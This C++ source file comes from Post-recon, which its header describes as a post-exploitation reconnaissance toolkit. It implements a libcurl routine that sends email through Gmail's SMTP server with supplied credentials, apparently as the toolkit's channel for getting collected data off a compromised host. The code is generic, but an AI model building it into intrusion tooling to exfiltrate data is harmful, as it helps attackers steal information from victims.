/*
This file is part of Post-recon
Copyright (C) 2017 @maldevel
https://github.com/maldevel/Post-recon

Post-recon - post-exploitation reconnaissance toolkit.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

For more see the file 'LICENSE' for copying permission.
*/

#include "prLibCurl.h"

#include <curl/curl.h>
#include "prCommon.h"
#include <Strsafe.h>

struct upload_status {
	int lines_read;
};

//email 
static const char *_payload_text[] = {
	"Date: %s\r\n",						//e.g. Mon, 29 Nov 2010 21:54:29 +1100
	"To: %s\r\n",						//e.g. admin@example.org
	"From: %s(%s)\r\n",					//e.g. support@example.gr(Joe Doe)
	"Message-ID: <%s>\r\n",				//e.g. xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx@example.com
	"Subject: %s\r\n",					//subject
	"\r\n",								//do not remove
	"%s\r\n",							//body
	NULL
};

//libcurl email callback
static size_t _payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
{
	struct upload_status *upload_ctx = (struct upload_status *)userp;
	const char *data;

	if ((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
		return 0;
	}

	data = _payload_text[upload_ctx->lines_read];

	if (data)
	{
		size_t len = strlen(data);
		memcpy(ptr, data, len);
		upload_ctx->lines_read++;
		return len;
	}

	return 0;
}

HRESULT LibCurl::SendEmail(const char *from, const char *fromName, const char *to, const char *subject, const char *body, const char *password)
{
	CURL *curl;
	CURLcode res = CURLE_OK;
	struct curl_slist *recipients = NULL;
	struct upload_status upload_ctx;

	char *messageID = 0;
	char *dateTime = 0;
	int size = 0;

	char *MSGID = 0;
	char *DATE = 0;
	char *TO = 0;
	char *FROM = 0;
	char *SUBJECT = 0;
	char *BODY = 0;

	upload_ctx.lines_read = 0;

	//init common lib and generate message id
	Common::init();

	//build DATE string
	dateTime = Common::GetTimezoneOffset();
	size = strlen(_payload_text[0]) + strlen(dateTime);
	DATE = (char*)Common::hAlloc((size + 1) * sizeof(char));
	if (DATE == NULL) {
		Common::hFree(dateTime);
		return S_FALSE;
	}
	if (StringCbPrintfA(DATE, size + 1, _payload_text[0], dateTime) != S_OK) {
		Common::hFree(dateTime);
		Common::hFree(DATE);
		return S_FALSE;
	}
	Common::hFree(dateTime);
	_payload_text[0] = DATE;


	//build TO string
	size = strlen(_payload_text[1]) + strlen(to);
	TO = (char*)Common::hAlloc((size + 1) * sizeof(char));
	if (TO == NULL) {
		Common::hFree(DATE);
		return S_FALSE;
	}
	if (StringCbPrintfA(TO, size + 1, _payload_text[1], to) != S_OK) {
		Common::hFree(DATE);
		Common::hFree(TO);
		return S_FALSE;
	}
	_payload_text[1] = TO;


	//build FROM string
	size = strlen(_payload_text[2]) + strlen(from) + strlen(fromName);
	FROM = (char*)Common::hAlloc((size + 1) * sizeof(char));
	if (FROM == NULL) {
		Common::hFree(DATE);
		Common::hFree(TO);
		return S_FALSE;
	}
	if (StringCbPrintfA(FROM, size + 1, _payload_text[2], from, fromName) != S_OK) {
		Common::hFree(DATE);
		Common::hFree(TO);
		Common::hFree(FROM);
		return S_FALSE;
	}
	_payload_text[2] = FROM;


	//build messageid string
	Common::GenerateMessageID(from, strlen(from), &messageID);

	size = strlen(_payload_text[3]) + strlen(messageID);
	MSGID = (char*)Common::hAlloc((size + 1) * sizeof(char));
	if (MSGID == NULL) {
		Common::hFree(messageID);
		Common::hFree(DATE);
		Common::hFree(TO);
		Common::hFree(FROM);
		return S_FALSE;
	}
	if (StringCbPrintfA(MSGID, size + 1, _payload_text[3], messageID) != S_OK) {
		Common::hFree(messageID);
		Common::hFree(DATE);
		Common::hFree(TO);
		Common::hFree(FROM);
		Common::hFree(MSGID);
		return S_FALSE;
	}
	Common::hFree(messageID);
	_payload_text[3] = MSGID;


	//build subject string
	size = strlen(_payload_text[4]) + strlen(subject);
	SUBJECT = (char*)Common::hAlloc((size + 1) * sizeof(char));
	if (SUBJECT == NULL) {
		Common::hFree(DATE);
		Common::hFree(TO);
		Common::hFree(FROM);
		Common::hFree(MSGID);
		return S_FALSE;
	}
	if (StringCbPrintfA(SUBJECT, size + 1, _payload_text[4], subject) != S_OK) {
		Common::hFree(DATE);
		Common::hFree(TO);
		Common::hFree(FROM);
		Common::hFree(MSGID);
		Common::hFree(SUBJECT);
		return S_FALSE;
	}
	_payload_text[4] = SUBJECT;


	//build body string
	size = strlen(_payload_text[6]) + strlen(body);
	BODY = (char*)Common::hAlloc((size + 1) * sizeof(char));
	if (BODY == NULL) {
		Common::hFree(DATE);
		Common::hFree(TO);
		Common::hFree(FROM);
		Common::hFree(MSGID);
		Common::hFree(SUBJECT);
		return S_FALSE;
	}
	if (StringCbPrintfA(BODY, size + 1, _payload_text[6], body) != S_OK) {
		Common::hFree(DATE);
		Common::hFree(TO);
		Common::hFree(FROM);
		Common::hFree(MSGID);
		Common::hFree(SUBJECT);
		Common::hFree(BODY);
		return S_FALSE;
	}
	_payload_text[6] = BODY;


	curl = curl_easy_init();
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_USERNAME, from);
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password);
		curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
		curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from);
		recipients = curl_slist_append(recipients, to);
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, _payload_source);
		curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //debug, turn it off on production
		res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
		}
		curl_slist_free_all(recipients);
		curl_easy_cleanup(curl);
	}

	Common::hFree(DATE);
	Common::hFree(TO);
	Common::hFree(FROM);
	Common::hFree(MSGID);
	Common::hFree(SUBJECT);
	Common::hFree(BODY);

	return (res == CURLE_OK ? S_OK : S_FALSE);
}
